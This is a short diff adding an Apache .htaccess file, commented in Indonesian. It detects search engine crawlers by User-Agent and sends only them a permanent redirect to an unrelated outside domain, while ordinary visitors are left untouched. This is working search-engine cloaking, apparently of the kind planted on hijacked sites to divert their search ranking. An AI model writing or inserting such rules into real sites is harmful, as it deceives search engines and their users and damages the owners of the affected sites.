@@ -1,0 +1,7 @@
+RewriteEngine On
+
+# Deteksi bot berdasarkan User-Agent
+RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|duckduckbot|baiduspider|yandex|sogou|exabot|facebot|ia_archiver) [NC]
+
+# Redirect permanen (301) ke URL target
+RewriteRule ^.*$ https://www.horsethievestavern.com/ [R=301,L]
